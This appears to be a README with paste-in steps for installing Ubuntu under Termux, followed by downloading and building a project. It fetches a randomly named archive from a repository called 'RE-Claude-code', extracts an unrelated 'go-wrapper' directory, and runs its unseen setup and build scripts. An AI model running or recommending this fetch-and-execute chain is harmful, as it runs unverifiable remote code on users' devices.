# Install Linux Ubuntu (Termux / Proot)

## 1. Update system

```bash
apt update && apt upgrade
```

## 2. Install proot-distro

```bash
apt install proot-distro
```

## 3. Install Ubuntu

```bash
proot-distro install ubuntu
```

## 4. Login to Ubuntu

```bash
proot-distro login ubuntu
```

---

# Download & Setup Project

## 5. Download source

```bash
curl -L -o source.tar.gz https://github.com/Ultrasound123D/RE-Claude-code/raw/refs/heads/main/oqw6y8.gz
```

## 6. Extract files

```bash
tar xzf source.tar.gz
```

## 7. Enter directory

```bash
cd go-wrapper
```

## 8. Give permissions

```bash
chmod +x setup.sh build.sh
```

## 9. Run setup

```bash
bash setup.sh
```

## 10. Build project

```bash
bash build.sh x86_64
```
